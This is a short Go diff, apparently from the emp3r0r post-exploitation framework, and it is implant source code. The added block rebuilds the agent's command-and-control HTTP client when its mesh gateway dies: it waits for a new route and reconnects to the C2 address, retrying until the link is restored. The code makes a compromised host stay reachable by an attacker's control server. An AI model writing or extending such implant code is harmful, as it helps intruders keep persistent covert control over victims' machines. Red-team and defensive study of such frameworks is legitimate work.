@@ -227,6 +227,18 @@ connect:
 			util.TakeASnap(false)
 			goto connect
 		}
+	} else if def.HTTPClient == nil {
+		// Gateway died: the gateway-dead goroutine cleared def.HTTPClient and is calling
+		// WaitForRoute(). Rather than polling with sleep, we call WaitForRoute() here too —
+		// it uses a channel internally and returns the moment a new gateway is available.
+		logging.Warningf("Mesh: HTTP client not ready, waiting for new gateway...")
+		newGW := mesh.WaitForRoute()
+		logging.Infof("Mesh: new gateway confirmed (%s), rebuilding C2 HTTP client", newGW)
+		def.HTTPClient = transport.CreateEmp3r0rHTTPClient(def.CCAddress, "")
+		if def.HTTPClient == nil {
+			logging.Errorf("Mesh: failed to rebuild C2 client, retrying...")
+			goto connect
+		}
 	}
 	if common.RuntimeConfig.C2TransportProxy != "" {
 		logging.Infof("Using proxy: %s", common.RuntimeConfig.C2TransportProxy)
